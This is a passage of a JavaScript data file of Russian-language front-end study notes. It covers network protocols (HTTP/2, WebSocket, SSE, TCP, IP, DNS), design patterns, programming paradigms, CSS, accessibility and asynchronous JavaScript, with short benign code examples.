**4. Бинарный протокол** — HTTP/1.1 текстовый, HTTP/2 бинарный → быстрее парсится, меньше ошибок.

**5. Приоритизация** — можно указать какие запросы важнее (CSS важнее картинок).

**Главный выигрыш — мультиплексирование.** Именно из-за него не нужны старые оптимизации HTTP/1.1: спрайты, domain sharding, конкатенация файлов.`},{name:"Различие Long-Polling, Websockets, Server-Sent Events",level:"3",content:`**Проблема:** HTTP — запрос/ответ. Сервер не может сам инициировать отправку данных клиенту. Нужны специальные техники для realtime.

---

**Long Polling**
Клиент отправляет запрос → сервер держит соединение открытым пока нет данных → появились данные, сервер отвечает → клиент сразу шлёт новый запрос.
\`\`\`js
async function longPoll() {
  const response = await fetch('/api/events');
  const data = await response.json();
  processData(data);
  longPoll(); // сразу новый запрос
}
\`\`\`
Минусы: новое HTTP-соединение каждый раз, задержки, неэффективно при высокой нагрузке.
Когда: простые случаи, старые браузеры, редкие обновления.

---

**WebSocket**
Полнодуплексное постоянное соединение. Клиент и сервер отправляют данные в любой момент.

Handshake — клиент отправляет HTTP-запрос с заголовком Upgrade:
\`\`\`
GET /chat HTTP/1.1
Upgrade: websocket       ← хочу переключиться на WebSocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==

→ HTTP/1.1 101 Switching Protocols  ← сервер согласен
\`\`\`
После этого то же TCP-соединение используется уже для WebSocket, не HTTP.
\`\`\`js
const ws = new WebSocket('wss://site.com/chat');

ws.onopen = () => ws.send(JSON.stringify({ type: 'message', text: 'hello' }));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
ws.onerror = (e) => console.error(e);
ws.onclose = (e) => console.log('закрыто', e.code);

ws.close(1000, 'работа завершена');
\`\`\`

Коды закрытия: 1000 — норма, 1001 — страница закрыта, 1006 — обрыв сети, 1011 — ошибка сервера.

Reconnect — вручную:
\`\`\`js
function connect() {
  const ws = new WebSocket('wss://site.com');
  ws.onclose = () => setTimeout(connect, 1000);
}
\`\`\`
Когда: чат, игры, реалтайм коллаборация, трейдинг.

---

**SSE (Server-Sent Events)**
Одностороннее соединение сервер → клиент. Обычный HTTP с Content-Type: text/event-stream. Автоматический reconnect встроен в браузер.
\`\`\`js
// Клиент:
const es = new EventSource('/stream');
es.onmessage = (e) => console.log(e.data);
es.addEventListener('update', (e) => console.log(e.data));
es.close();
\`\`\`
\`\`\`js
// Сервер (Node.js):
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');

res.write('data: привет\\n\\n');              // простое сообщение
res.write('event: update\\n');               // именованное событие
res.write('data: {"price": 100}\\n\\n');
res.write('id: 42\\n');                      // ID для reconnect
res.write('data: сообщение\\n\\n');
res.write('retry: 3000\\n\\n');              // задержка reconnect (мс)
\`\`\`
При обрыве браузер переподключается сам и отправляет Last-Event-ID — сервер знает с какого события продолжать.
Когда: лента новостей, уведомления, прогресс операции, live логи.

---

**Сравнение:**

**Long Polling** — HTTP, двустороннее, новое соединение каждый раз, reconnect вручную, простой.
**WebSocket** — WS/WSS, двустороннее, постоянное соединение, reconnect вручную, средний.
**SSE** — HTTP, только сервер→клиент, постоянное соединение, reconnect автоматически, простой.`},{name:"Базовое понимание TCP",level:"4",content:`**TCP (Transmission Control Protocol)** — протокол транспортного уровня. Обеспечивает надёжную доставку данных между двумя точками.
Интернет передаёт данные пакетами — они могут потеряться, прийти не в том порядке, задублироваться. TCP решает все эти проблемы.

**Модель OSI (упрощённо):**
\`\`\`
Приложение: HTTP, WebSocket, FTP, DNS
Транспорт:  TCP, UDP
Сеть:       IP
Канал:      Ethernet, WiFi
Физический: провода, радиоволны
\`\`\`
Каждый уровень использует нижний как транспорт. HTTP работает поверх TCP, TCP работает поверх IP.

**3-way handshake — установка соединения:**
\`\`\`
Клиент → Сервер:  SYN          (хочу соединиться, мой seq=100)
Сервер → Клиент:  SYN + ACK    (согласен, мой seq=200, подтверждаю твой 101)
Клиент → Сервер:  ACK          (принял, подтверждаю твой 201)
\`\`\`
После этого соединение установлено. Это причина задержки HTTP/1.1 — каждое новое соединение требует handshake.

**Закрытие — 4-way handshake:**
\`\`\`
Клиент → Сервер:  FIN    (я закончил отправку)
Сервер → Клиент:  ACK    (принял)
Сервер → Клиент:  FIN    (я тоже закончил)
Клиент → Сервер:  ACK    (принял, соединение закрыто)
\`\`\`

**Главные характеристики:**
• **Надёжность** — каждый пакет подтверждается через ACK. Нет подтверждения → повтор отправки.
• **Порядок** — каждый пакет имеет sequence number. Получатель собирает пакеты в правильном порядке даже если пришли вразнобой.
• **Flow Control** — получатель сообщает сколько данных готов принять (window size). Отправитель не перегружает получателя.
• **Congestion Control** — TCP снижает скорость если сеть перегружена.

**TCP vs UDP:**
**TCP** — гарантирует доставку, сохраняет порядок, медленнее, 3-way handshake, высокий overhead.
**UDP** — без гарантий, порядок не гарантирован, быстрее, нет handshake, минимальный overhead.

TCP используют: HTTP, HTTPS, WebSocket, FTP, SSH.
UDP используют: видеозвонки (WebRTC, Zoom), онлайн игры, DNS, стриминг, HTTP/3 (QUIC).

**Почему UDP для видео/игр:**
Потеря пакета в TCP → повтор → задержка. В видеозвонке лучше пропустить кадр чем ждать повтора — это создаёт заморозку. UDP просто отбрасывает потерянный пакет и продолжает.

**HTTP/3 и QUIC:**
HTTP/3 работает поверх QUIC — протокол на базе UDP но с надёжностью на уровне приложения: нет 3-way handshake, мультиплексирование без head-of-line blocking, встроенное шифрование TLS 1.3.

**Keep-Alive:**
HTTP/1.1 по умолчанию держит TCP-соединение открытым для нескольких запросов (Connection: keep-alive). Без этого каждый запрос = новый TCP handshake. HTTP/2 идёт дальше — одно соединение для всех запросов.`},{name:"Базовое понимание IP",level:"4",content:`**IP (Internet Protocol)** — протокол сетевого уровня. Отвечает за адресацию и маршрутизацию пакетов между сетями.

TCP разбивает данные на пакеты. IP доставляет каждый пакет от отправителя к получателю через цепочку роутеров. IP не гарантирует доставку — это задача TCP.

**Структура IP-пакета:**
\`\`\`
Заголовок:
  Source IP      — откуда пакет
  Destination IP — куда пакет
  TTL            — время жизни пакета
  Protocol       — что внутри (TCP=6, UDP=17)
  Checksum       — проверка целостности заголовка
Данные (payload) — TCP сегмент внутри
\`\`\`

**TTL (Time To Live):**
Каждый пакет имеет счётчик TTL (обычно 64 или 128). Каждый роутер уменьшает TTL на 1. TTL = 0 → пакет уничтожается → отправителю приходит ICMP "Time Exceeded".
Зачем: предотвращает бесконечную циркуляцию потерявшихся пакетов.
\`\`\`bash
traceroute google.com
# Отправляет пакеты с TTL=1, TTL=2, TTL=3...
# Каждый роутер отвечает — видим весь маршрут
\`\`\`

**Маршрутизация:**
\`\`\`
Твой компьютер → Домашний роутер → Роутер провайдера → ... → Сервер
\`\`\`
Каждый роутер смотрит на Destination IP и решает куда передать дальше по таблице маршрутизации. IP не знает весь путь заранее — каждый роутер решает локально.

**IPv4 vs IPv6:**
• **IPv4** — 32 бита (192.168.1.1), ~4 млрд адресов, закончились, решение: NAT
• **IPv6** — 128 бит (2001:0db8::8a2e:0370:7334), 340 ундециллионов адресов, встроенный IPSec, нет NAT

**NAT (Network Address Translation):**
Из-за нехватки IPv4 адресов несколько устройств домашней сети выходят в интернет через один публичный IP:
\`\`\`
192.168.1.2 (телефон)   ┐
192.168.1.3 (ноутбук)   ├─→ Роутер (NAT) → 85.142.10.5 (один публичный IP)
192.168.1.4 (телевизор) ┘
\`\`\`
Приватные диапазоны (не маршрутизируются в интернете):
\`\`\`
10.0.0.0/8       — большие сети
172.16.0.0/12    — средние сети
192.168.0.0/16   — домашние сети
127.0.0.0/8      — loopback (localhost)
\`\`\`

**ICMP — служебные сообщения:**
\`\`\`bash
ping google.com       # проверить доступность хоста
traceroute google.com # показать маршрут пакета
\`\`\`
Также ICMP сообщает: "Destination Unreachable" (хост недоступен), "Time Exceeded" (TTL истёк).`},{name:"Базовое понимание DNS",level:"4",content:`**DNS (Domain Name System)** — преобразует доменное имя в IP-адрес.

**Как браузер резолвит домен:**
1. Браузер проверяет свой кэш
2. ОС проверяет файл hosts (/etc/hosts)
3. Запрос к DNS резолверу провайдера
4. Резолвер проверяет свой кэш
5. Если нет — рекурсивный запрос по иерархии

**Иерархия DNS:**
\`\`\`
Root DNS серверы (.)
    ↓
TLD серверы (.com, .ru, .org)
    ↓
Authoritative серверы (google.com)
    ↓
Ответ: 142.250.185.46
\`\`\`
• **Root серверы** — знают где TLD серверы. Их всего 13 кластеров в мире.
• **TLD серверы** — знают где authoritative серверы для каждого домена.
• **Authoritative серверы** — хранят реальные DNS записи домена.

**DNS записи:**
• **A** — домен → IPv4: google.com → 142.250.185.46
• **AAAA** — домен → IPv6
• **CNAME** — псевдоним: www.google.com → google.com
• **MX** — почтовый сервер домена
• **TXT** — текстовые данные (верификация, SPF)
• **NS** — какие серверы отвечают за домен

**TTL в DNS:**
Каждая запись имеет TTL — сколько секунд её кэшировать. При смене IP нужно ждать пока TTL истечёт у всех кэшей. Поэтому при переезде сайта ставят низкий TTL заранее.

**Файл hosts:**
До DNS-запроса ОС проверяет локальный файл — используется для локальной разработки и блокировки сайтов.
\`\`\`
# /etc/hosts (Linux/Mac)
127.0.0.1       localhost
192.168.1.10    mydevserver.local
\`\`\`

**DNS over HTTPS (DoH):**
Обычный DNS — незашифрованный UDP порт 53, провайдер видит все запросы. DoH — DNS через HTTPS, зашифрован. Используют Cloudflare (1.1.1.1), Google (8.8.8.8).`}]},{id:"patterns",title:"ПАТТЕРНЫ",icon:"🧩",color:"#AB47BC",topics:[{name:"DRY, KISS, YAGNI",level:"2",content:`**DRY (Don't Repeat Yourself):** каждая часть знания имеет единственное представление. Дублирование → вынести в функцию/модуль. Но: не путай совпадение кода с дублированием логики.

**KISS (Keep It Simple, Stupid):** простое решение лучше сложного. Не усложняй без необходимости. Читаемость > краткость.

**YAGNI (You Aren't Gonna Need It):** не реализуй функционал «на будущее». Делай только то, что нужно сейчас. Преждевременная абстракция — зло.`},{name:"Навык использования и определения паттерна в коде: Observer",level:"3",content:`**Observer (Наблюдатель)** — объект уведомляет подписчиков о своих изменениях.

\`\`\`js
class EventEmitter {
  constructor() { this.listeners = {}; }
  on(event, fn) {
    (this.listeners[event] ||= []).push(fn);
  }
  off(event, fn) {
    this.listeners[event] = this.listeners[event]?.filter(f => f !== fn);
  }
  emit(event, data) {
    this.listeners[event]?.forEach(fn => fn(data));
  }
}
\`\`\`

**Где в JS:** addEventListener, RxJS, EventEmitter в Node.js, Redux store.subscribe(), Vue reactivity.`},{name:"Factory Method, Prototype, Proxy, Singleton",level:"3",content:`**Singleton** — гарантирует один экземпляр класса на всё приложение:
\`\`\`js
class Database {
  static instance = null;

  constructor(url) {
    if (Database.instance) return Database.instance;
    this.url = url;
    Database.instance = this;
  }
}

const db1 = new Database('localhost');
const db2 = new Database('remotehost');
db1 === db2; // true
db2.url;     // 'localhost' — второй конструктор проигнорировался
\`\`\`
В JS ES-модули — уже Singleton: экспортируемый объект кэшируется, все импорты получают одну ссылку.
Где: подключение к БД, логгер, конфиг, Redux store.
Минусы: глобальное состояние, сложно тестировать.

**Factory Method** — инкапсулирует логику создания объектов, вызывающий код не знает какой конкретно класс создаётся:
\`\`\`js
function createTransport(type) {
  switch(type) {
    case 'car':   return new Car();
    case 'bike':  return new Bike();
    case 'truck': return new Truck();
    default: throw new Error('Unknown type');
  }
}
\`\`\`
ООП вариант — подкласс переопределяет метод создания:
\`\`\`js
class Dialog {
  createButton() { throw new Error('Переопредели меня!'); }
  render() { this.createButton().render(); }
}
class WindowsDialog extends Dialog {
  createButton() { return new WindowsButton(); }
}
\`\`\`
Где: \`React.createElement\`, \`document.createElement\`, UI под разные платформы.

**Prototype (паттерн)** — создаёт объекты клонированием существующего. Используется когда создание дорого:
\`\`\`js
class Circle {
  constructor(radius, color) {
    this.radius = radius;
    this.color = color;
  }
  clone() {
    return Object.assign(Object.create(Object.getPrototypeOf(this)), this);
  }
}

const c1 = new Circle(10, 'red');
const c2 = c1.clone();
c2.color = 'blue';
c1.color; // 'red' — оригинал не тронут
\`\`\`
Встроенные методы:
\`\`\`js
const shallow = { ...original };                         // поверхностное
const deep = structuredClone(original);                  // глубокое (современный способ)
const deep2 = JSON.parse(JSON.stringify(original));      // старый способ, теряет функции/undefined
\`\`\`
Где: копирование конфигов, undo/redo снапшоты, клонирование игровых объектов.

**Proxy** — обёртка, перехватывающая операции с объектом:
\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`Читаем: \${prop}\`);
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    if (prop === 'age' && typeof value !== 'number')
      throw new TypeError('Только числа!');
    return Reflect.set(target, prop, value, receiver);
  },
  deleteProperty(target, prop) {
    return Reflect.deleteProperty(target, prop);
  }
};
const data = new Proxy({}, handler);
\`\`\`
Применение:
\`\`\`js
// Реактивность (как Vue 3):
function reactive(obj) {
  return new Proxy(obj, {
    set(target, prop, value) {
      target[prop] = value;
      render();
      return true;
    }
  });
}

// Кэширование:
const cached = new Proxy(api, {
  get(target, method) {
    return async (...args) => {
      const key = \`\${method}:\${JSON.stringify(args)}\`;
      if (cache.has(key)) return cache.get(key);
      const result = await target[method](...args);
      cache.set(key, result);
      return result;
    };
  }
});
\`\`\`
Где: Vue 3 реактивность, MobX, валидация, логирование, кэширование.

**Сравнение:**
\`\`\`
Паттерн    Задача                  Когда
Singleton  один экземпляр          глобальные сервисы, конфиги
Factory    инкапсуляция создания   разные типы объектов
Prototype  клонирование            дорогое создание объектов
Proxy      перехват операций       валидация, кэш, реактивность
\`\`\``},{name:"Навык использования и определения паттерна в коде: Decorator",level:"3",content:`**Decorator** — оборачивает объект/функцию, добавляя поведение без изменения оригинала.

\`\`\`js
function withLogging(fn) {
  return function(...args) {
    console.log('Calling', fn.name, args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    return result;
  };
}

const add = (a, b) => a + b;
const loggedAdd = withLogging(add);
loggedAdd(2, 3); // Calling add [2,3] → Result: 5
\`\`\`

**TC39 Decorators (Stage 3):**
\`\`\`js
@logged
class MyClass { ... }
\`\`\`

**Где:** HOC в React, middleware в Express/Redux, TypeORM entity decorators.`},{name:"Навык использования и определения паттерна в коде: Dependency Injection",level:"4",content:`**DI** — зависимости передаются извне, а не создаются внутри.

\`\`\`js
// Без DI — жёсткая связь
class UserService {
  constructor() {
    this.db = new PostgresDB(); // привязан к PostgresDB
  }
}

// С DI — гибкая связь
class UserService {
  constructor(db) { // получает снаружи
    this.db = db;
  }
}
new UserService(new PostgresDB());
new UserService(new MockDB()); // для тестов!
\`\`\`

**Преимущества:** тестируемость (моки), гибкость, слабая связанность.

**Где в React:** Context как DI-контейнер, передача зависимостей через props, кастомные хуки.`}]},{id:"dev",title:"РАЗРАБОТКА ПО",icon:"⚙️",color:"#78909C",topics:[{name:"Функциональное программирование, его отличие от ООП",level:"2",content:`**ФП:**
• Данные неизменяемы (immutability)
• Чистые функции (нет побочных эффектов)
• Функции — first-class citizens
• Композиция функций
• Декларативный стиль

**ООП:**
• Данные + поведение в объектах
• Инкапсуляция, наследование, полиморфизм
• Изменяемое состояние
• Императивный стиль

**В JS используются оба:** React (ФП — компоненты как чистые функции, иммутабельный state) + классы, наследование.

**Currying** — преобразование функции с N аргументами в цепочку функций с одним:
\`\`\`js
const add = a => b => a + b;
const add5 = add(5);
add5(3); // 8 — частичное применение

// Практика: предконфигурация
const fetchWith = baseUrl => endpoint => fetch(baseUrl + endpoint);
const api = fetchWith('https://api.example.com');
api('/users'); // настроен один раз, переиспользуется
\`\`\`

**Pipe / Compose** — объединение функций в цепочку (data pipeline):
\`\`\`js
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);

const transform = pipe(
  str => str.trim(),
  str => str.toLowerCase(),
  str => str.replace(/s+/g, '-')
);
transform('  Hello World '); // 'hello-world'
\`\`\`

**Иммутабельность:** никогда не мутируй — возвращай новый объект/массив:
\`\`\`js
// ❌ мутация
state.count++;
arr.push(item);
// ✅ иммутабельно
{ ...state, count: state.count + 1 }
[...arr, item]
\`\`\`
Именно поэтому React не видит изменения при мутации state — ссылка та же.`},{name:"SOLID, Cohesion и Coupling",level:"3",content:`**S** — Single Responsibility: класс/модуль — одна ответственность
**O** — Open/Closed: открыт для расширения, закрыт для изменения
**L** — Liskov Substitution: подклассы заменяют родителей без поломок
**I** — Interface Segregation: много специфичных интерфейсов лучше одного общего
**D** — Dependency Inversion: зависеть от абстракций, не от деталей

**Cohesion (связность):** насколько элементы модуля связаны по смыслу. Высокая — хорошо.
**Coupling (связанность):** насколько модули зависят друг от друга. Низкая — хорошо.

**Цель:** High Cohesion + Low Coupling.`},{name:"MVC, MVVM",level:"4",content:`**MVC (Model-View-Controller):**
• **Model** — данные и бизнес-логика
• **View** — отображение (UI)
• **Controller** — обрабатывает ввод, обновляет Model и View

**MVVM (Model-View-ViewModel):**
• **Model** — данные
• **View** — UI (декларативный)
• **ViewModel** — состояние View + логика. Двустороннее связывание (data binding)

**В React:** ближе к однонаправленному потоку. Component = View + часть ViewModel. State/Redux = Model. Не чистый MVC/MVVM.

**В Vue:** ближе к MVVM (реактивное двустороннее связывание через v-model).`}]},{id:"css",title:"ВЁРСТКА",icon:"🎨",color:"#E44D26",topics:[{name:"Блочная модель",level:"1",content:`Content → Padding → Border → Margin

**content-box** (по умолчанию): width = только content. Padding + border добавляются сверху.
**border-box**: width = content + padding + border. Margin НЕ входит.

\`\`\`css
*, *::before, *::after { box-sizing: border-box; }
\`\`\`

**Margin collapsing:**
Вертикальные margins соседних блочных элементов схлопываются — берётся **больший**:
\`\`\`css
.a { margin-bottom: 20px; }
.b { margin-top: 30px; }
/* расстояние между ними = 30px, не 50px */
\`\`\`

**3 случая коллапса:**
1. Соседние siblings (братья)
2. Родитель и первый/последний ребёнок — если нет border/padding/overflow между ними
3. Пустой блок — его margin-top коллапсирует с margin-bottom

**Как предотвратить:** добавить padding/border на родителя, \`overflow: hidden\`, \`display: flex/grid\`.
Flexbox и Grid children **не коллапсируют** margins — одна из причин почему grid/flex так удобны.`,score:4},{name:"Семантичные теги, базовые теги",level:"1",content:`Семантические теги: header, main, footer, nav, section, article, aside, figure.

Семантика нужна для: доступности (скринридеры), SEO, читаемости кода.

**section** — блок с конкретной смысловой нагрузкой.
**article** — независимый контент (пост, комментарий).
**div** — нет семантики, для группировки/стилизации.`,score:4.5},{name:"Базовые CSS свойства",level:"1",content:`**display: none** — убирает из потока (нет размеров).
**visibility: hidden** — скрывает, но занимает место.
**opacity: 0** — скрывает, занимает место, реагирует на клики.

**position:** static (по умолчанию), relative (смещение от своего места), absolute (от ближайшего позиционированного предка), fixed (от viewport), sticky (гибрид relative + fixed).`,score:5},{name:"Специфичность селекторов",level:"2",content:`Формула **(a, b, c):**
• a = id
• b = классы, атрибуты, псевдоклассы
• c = теги, псевдоэлементы

\`!important > inline > #id > .class > tag\`

При равной специфичности → каскадность (позже = приоритетнее).`,score:4.5},{name:"Базовые псевдоклассы",level:"2",content:`**Псевдоклассы (:)** — состояние элемента: :hover, :active, :focus, :first-child, :nth-child(n), :not(), :checked, :disabled.

**Псевдоэлементы (::)** — виртуальный элемент: ::before, ::after, ::placeholder, ::selection.

**:nth-child(2)** — второй потомок вообще.
**:nth-of-type(2)** — второй элемент данного типа.

**:focus** — срабатывает при любом фокусе (мышь, клавиатура, программно).
**:focus-visible** — срабатывает только когда фокус виден пользователю — то есть при навигации с клавиатуры.

Зачем: кнопки при клике мышью получают :focus и показывают outline — это раздражает. С :focus-visible outline показывается только при навигации клавиатурой — удобно для accessibility.`,score:5},{name:"Типографика. Шрифты. Подключение шрифтов",level:"3",content:`**@font-face** — подключение локальных шрифтов:
\`\`\`css
@font-face {
  font-family: 'MyFont';
  src: url('./fonts/MyFont.woff2') format('woff2');
  font-display: swap;
}
\`\`\`

**Форматы:** woff2 (лучший, сжатие Brotli), woff (fallback), ttf/otf (старые).

**em vs rem:**
**em** — относительно размера шрифта родителя. Накапливается при вложенности:
\`\`\`css
/* Родитель 16px, дочерний 1.5em = 24px, внук 1.5em = 36px! */
\`\`\`
**rem** — относительно размера шрифта корневого элемента (html). Всегда предсказуемо:
\`\`\`css
html { font-size: 16px; }
.text { font-size: 1.5rem; } /* всегда 24px */
\`\`\`
Поэтому rem предпочтительнее для типографики.

**font-display:**
• **auto** — браузер решает сам
• **block** — текст невидим пока шрифт не загрузится (FOIT)
• **swap** — сразу показывает системный шрифт, потом меняет (FOUT) ✅ чаще всего используют
• **fallback** — короткий период невидимости (100ms), потом системный; если шрифт не успел — остаётся системный
• **optional** — браузер сам решает показывать кастомный шрифт или нет (зависит от скорости соединения)

swap — самый популярный выбор для производительности.`,score:3.5},{name:"PostCSS",level:"3",content:`**PostCSS** — инструмент для трансформации CSS через плагины.

Популярные плагины:
• **postcssPresetEnv** — современный CSS → полифилы (как Babel для CSS)
• **autoprefixer** — вендорные префиксы
• **postcssNested** — вложенность как в SASS
• **postcssMixins** — миксины
• **postcssImport** — @import`,score:4},{name:"Flexbox",level:"3",content:`Одномерная раскладка (строка ИЛИ колонка).

**Центрирование:** display: flex + justify-content: center + align-items: center.

**align-items** — внутри одной строки.
**align-content** — распределяет строки (только при flex-wrap: wrap).

**flex: 1** = flex-grow: 1, flex-shrink: 1, flex-basis: 0%.

**flex-grow** — как много элемент растёт относительно других.
**flex-shrink** — как много элемент сжимается.
**flex-basis** — начальный размер элемента.`,score:4},{name:"Базовое понимание контекста наложения",level:"3",content:`**z-index** работает с позиционированными элементами (relative, absolute, fixed, sticky). Может быть отрицательным.

**Stacking context** создаёт:
• position: absolute/relative/fixed/sticky + z-index не auto
• opacity < 1
• transform не none
• filter не none
• isolation: isolate
• will-change

Дочерний элемент соревнуется только внутри stacking context родителя.

**Главная ловушка** — z-index работает только внутри одного контекста наложения. Элемент с z-index: 9999 не перекроет элемент из другого контекста если его родитель имеет меньший z-index.`,score:3.5},{name:"Современные подходы к организации стилей",level:"3",content:`**CSS-Modules:** автоматические уникальные имена классов.
**CSS-in-JS (styled-components):** стили в JS, динамика через props. Минус: runtime-стоимость.
**Zero-runtime:** vanilla-extract, Linaria, Panda CSS — CSS-in-JS синтаксис, но компиляция в статичный CSS.`,score:3.5},{name:"Базовые свойства Grid",level:"3",content:`Двумерная раскладка (строки И колонки одновременно).

\`\`\`css
.grid {
  display: grid;
  grid-template-columns: 1fr 2fr 1fr;
  grid-template-rows: auto;
  gap: 16px;
}
\`\`\`

**fr** — доля свободного пространства: 1fr 2fr 1fr = 25% 50% 25%.

**grid-area** — размещение элемента по именованным областям.
**minmax(200px, 1fr)** — адаптивные колонки.

**auto-fill** — создаёт колонки даже если элементов нет, пустые колонки занимают место.
**auto-fit** — пустые колонки схлопываются до 0, существующие элементы растягиваются на всю ширину.`,score:4},{name:"Векторная и растровая графика",level:"4",content:`**Растровые форматы:**
• **JPG** — сжатие с потерями, для фото, нет прозрачности
• **PNG** — без потерь, поддерживает прозрачность, тяжелее JPG
• **WebP** — современный формат, меньше JPG/PNG при том же качестве, прозрачность есть
• **AVIF** — ещё новее, ещё лучше сжатие

**SVG:**
• Масштабируется без потери качества
• Можно анимировать через CSS/JS
• Индексируется поисковиками
• Может быть инлайн в HTML

**Когда что использовать:**
• **SVG** — иконки, логотипы, иллюстрации, анимации
• **WebP/AVIF** — фотографии, сложные изображения с градиентами
• **PNG** — когда нужна прозрачность и нет поддержки WebP

**Адаптивные изображения (srcset):**
\`\`\`html
<img
  src="img-800.webp"
  srcset="img-400.webp 400w, img-800.webp 800w, img-1600.webp 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  loading="lazy"
  decoding="async"
  alt="..."
/>
\`\`\`
Браузер сам выбирает нужный размер — не грузит лишнего.

**picture с fallback:**
\`\`\`html
<picture>
  <source srcset="img.avif" type="image/avif">
  <source srcset="img.webp" type="image/webp">
  <img src="img.jpg" alt="...">
</picture>
\`\`\`

**SVG inline vs img:**
Inline SVG — можно анимировать и стилизовать через CSS, но не кэшируется.
\`\`\`html
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24">
  <circle cx="12" cy="12" r="10" fill="currentColor"/>
</svg>
\`\`\`

img tag с SVG — кэшируется браузером, но нельзя стилизовать через CSS.
\`\`\`html
<img src="icon.svg" alt="icon" width="24" height="24">
\`\`\``,score:2},{name:"browserslist",level:"4",content:`Конфиг, определяющий целевые браузеры. Читают: Autoprefixer, Babel, PostCSS Preset Env, ESLint.

\`\`\`json
"browserslist": ["> 1%", "last 2 versions", "not dead"]
\`\`\`

• **> 1%** — браузеры с долей использования больше 1% глобально
• **last 2 versions** — последние 2 версии каждого браузера
• **not dead** — исключает браузеры без официальной поддержки более 2 лет

Все инструменты работают согласованно по одному конфигу.

**Где хранить:**
• **.browserslistrc** — отдельный файл
• **package.json** — поле "browserslist"
• **в конфиге инструмента** — например в postcss.config.js`,score:2.5},{name:"Доступность (aria, tabindex & etc.)",level:"4",content:`**tabindex:** 0 — в порядке DOM, -1 — только программно (focus()), положительный — антипаттерн.

**ARIA атрибуты:**
• **aria-label** — текстовое описание элемента для скринридера (когда нет видимого текста)
• **aria-hidden="true"** — скрывает элемент от скринридера (декоративные иконки)
• **aria-expanded** — состояние раскрытия (аккордеон, дропдаун)
• **aria-live** — объявляет динамические изменения (уведомления, ошибки)
• **role** — явно указывает роль элемента (role="button", role="dialog")

**Первое правило ARIA:** если есть нативный HTML-элемент — используй его вместо ARIA. button лучше чем div с role="button".

**Focus management:**
\`\`\`js
// При открытии модального окна — фокус внутрь
useEffect(() => { if (isOpen) modalRef.current?.focus(); }, [isOpen]);

// При закрытии — вернуть фокус на кнопку открытия
useEffect(() => { if (!isOpen) triggerRef.current?.focus(); }, [isOpen]);
\`\`\`

**Focus trap в модальном окне:**
\`\`\`html
<!-- Современный способ -->
<dialog> <!-- нативный <dialog> имеет встроенный focus trap --> </dialog>

<!-- Или inert атрибут на всё кроме модального -->
<div inert>Контент позади — недоступен Tab, клик, screen reader</div>
\`\`\`

**Клавиатурная навигация (стандарты):**
• Enter/Space — активация button/link
• Escape — закрыть модальное окно, dropdown
• Arrow keys — навигация внутри composite widget (меню, tabs, listbox)

**WCAG контраст:** 4.5:1 для обычного текста, 3:1 для крупного (18px+) и UI элементов.

**aria-live (live regions)** — объявления для screen reader при динамических обновлениях:
\`\`\`html
<div aria-live="polite">Загрузка завершена</div>     <!-- не прерывает чтение -->
<div aria-live="assertive">Критическая ошибка!</div>  <!-- прерывает сразу -->
\`\`\``,score:3}]},{id:"async",title:"АСИНХРОННОСТЬ",icon:"🔄",color:"#FF6B6B",topics:[{name:"XMLHttpRequest, fetch",level:"2",content:`**XMLHttpRequest** — колбэки. **fetch** — промисы.

**fetch при 404/500 — НЕ попадает в catch!** Только сетевые ошибки. Проверять response.ok.

\`\`\`js
fetch('/api').then(res => {
  if (!res.ok) throw new Error(res.status);
  return res.json();
}).catch(err => console.log(err));
\`\`\`

**Отмена запроса:**

 XHR — просто:
\`\`\`js
xhr.abort();
\`\`\`

fetch — через AbortController:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal });

// Отменяем запрос
controller.abort();
\`\`\`
AbortController универсальнее — работает с любым Promise-based API.`,score:3.5},{name:"Механизм Event loop, тасоки и микротасоки",level:"3",content:`**Один тик Event Loop:**
Макротаска → Все микротаски → rAF → Рендеринг → Следующая макротаска

**Микротаски:** Promise.then, queueMicrotask, MutationObserver. Опустошаются полностью.
**rAF:** requestAnimationFrame — перед рендером, НЕ микро и НЕ макро.
**Макротаски:** setTimeout, setInterval, I/O.

Микротаска может породить микротаску → выполнится до макротаски. Бесконечные микротаски → блокировка.`,score:4},{name:"async/await: Синтаксис, обработка ошибок",level:"3",content:`async-функция всегда возвращает Promise.

**await** разрезает функцию: до await — синхронно, после await — микротаска (.then()).

\`\`\`js
async function foo() { console.log(1); await x; console.log(2); }
console.log(3); foo(); console.log(4);
// 3, 1, 4, 2
\`\`\`

**Обработка ошибок:** try/catch или .catch() на промисе.

**return value vs return Promise.resolve(value):** второй на один микротик медленнее.

**Promise методы:**
• **Promise.all(promises)** — ждёт все, падает при первой ошибке. Результат: массив значений в том же порядке.
• **Promise.allSettled(promises)** — ждёт все, не падает. Результат: массив {status, value/reason}.
• **Promise.race(promises)** — возвращает первый завершившийся (fulfilled и rejected). Остальные игнорируются.
• **Promise.any(promises)** — возвращает первый успешный. Если все упали — AggregateError.
• **Promise.resolve(value)** — создаёт уже зарезолвленный Promise.
• **Promise.reject(reason)** — создаёт уже отклонённый Promise.

**Нюансы:**
\`\`\`js
Promise.race([rejected, resolved]) // вернёт rejected — первый завершился
Promise.any([rejected, resolved])  // вернёт resolved — первый успешный
\`\`\`
Promise.all — порядок результатов совпадает с порядком промисов, не с порядком завершения:
\`\`\`js
const [a, b] = await Promise.all([slowRequest, fastRequest]);
// a — результат slowRequest, b — fastRequest
\`\`\`
Promise.allSettled — никогда не попадёт в .catch().
Promise.any — единственный метод который бросает AggregateError (содержит массив всех ошибок).

**Цепочка .then().catch().finally():**
\`\`\`js
fetch('/api')
  .then(res => res.json())          // трансформация
  .catch(err => fallback)           // обработка ошибки, возвращает значение — цепочка продолжается!
  .finally(() => setLoading(false)) // выполняется всегда, не получает значение
\`\`\`

**После .catch() можно продолжить .then()** — если catch не бросает ошибку, цепочка восстанавливается:
\`\`\`js
fetch('/api')
  .then(res => res.json())
  .catch(err => ({ error: true }))  // вернули fallback-значение
  .then(data => render(data))       // выполнится с fallback-значением
\`\`\`
Если внутри .catch() сделать throw — следующие .then() будут пропущены до следующего .catch().`,score:4},{name:"Генераторы и итераторы",level:"4",content:`**Два протокола:**
